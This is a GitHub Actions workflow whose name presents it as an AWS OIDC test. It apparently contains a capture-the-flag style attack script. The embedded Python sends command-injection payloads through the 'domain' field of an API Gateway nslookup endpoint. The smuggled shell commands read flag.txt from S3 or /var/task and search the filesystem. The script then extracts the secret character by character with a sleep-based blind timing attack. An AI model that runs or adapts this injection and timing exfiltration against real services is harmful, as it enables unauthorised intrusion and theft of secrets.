name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Debug and Timing Extraction
        run: |
          python3 << 'PYEOF'
          import subprocess
          import json
          import time

          API_ID = "3q931syi7b"
          REGION = "us-east-1"
          URL = f"https://{API_ID}.execute-api.{REGION}.amazonaws.com/dev/nslookup"

          print("=== 1. TESTING WHERE FLAG.TXT LIVES ===" )
          # Let's try S3 first, then fallback to local search if S3 is empty
          debug_domain = '127.0.0.1; F=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1 2>&1); echo "S3_RESULT: $F"; find / -name flag.txt 2>/dev/null'
          payload = json.dumps({"domain": debug_domain})
          
          result = subprocess.run(
              ["curl", "-s", "-X", "POST", URL, "-H", "Content-Type: application/json", "-d", payload],
              capture_output=True, text=True
          )
          print("Debug Response from API Gateway:")
          print(result.stdout)

          def test_char(pos, mid):
              idx = pos - 1
              # Fallback: check S3 or local path /var/task/flag.txt
              domain = (
                  f'127.0.0.1; '
                  f'F=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1 2>/dev/null || cat /var/task/flag.txt 2>/dev/null); '
                  f'if [ -n "$F" ]; then '
                  f'  printf \'%s\' "$F" | python3 -c "import sys; c=ord(sys.stdin.read()[{idx}]); sys.exit(0 if c>{mid} else 1)" && sleep 5; '
                  f'fi'
              )
              payload = json.dumps({"domain": domain})
              
              start = time.time()
              try:
                  res = subprocess.run(
                      ["curl", "-s", "--max-time", "6", "-X", "POST", URL,
                       "-H", "Content-Type: application/json", "-d", payload],
                      capture_output=True, text=True, timeout=15
                  )
                  elapsed = time.time() - start
                  response = res.stdout
              except subprocess.TimeoutExpired:
                  elapsed = 15
                  response = ""
              
              if elapsed >= 4.5 or not response or "wip" not in response:
                  return True
              return False

          FLAG_LEN = 16
          flag = []
          
          print("\n=== 2. STARTING TIMING EXTRACTION ===")
          for pos in range(1, FLAG_LEN + 1):
              print(f"Brute-forcing position {pos}...", flush=True)
              low, high = 32, 126
              while low < high:
                  mid = (low + high) // 2
                  if test_char(pos, mid):
                      low = mid + 1
                  else:
                      high = mid
              char = chr(low)
              print(f">>> Position {pos} = '{char}' (ASCII {low})")
              flag.append(char)
              print(f"Flag so far: {''.join(flag)}")

          print("\n=======================")
          print(f"FINAL FLAG: {''.join(flag)}")
          print("=======================")
          PYEOF
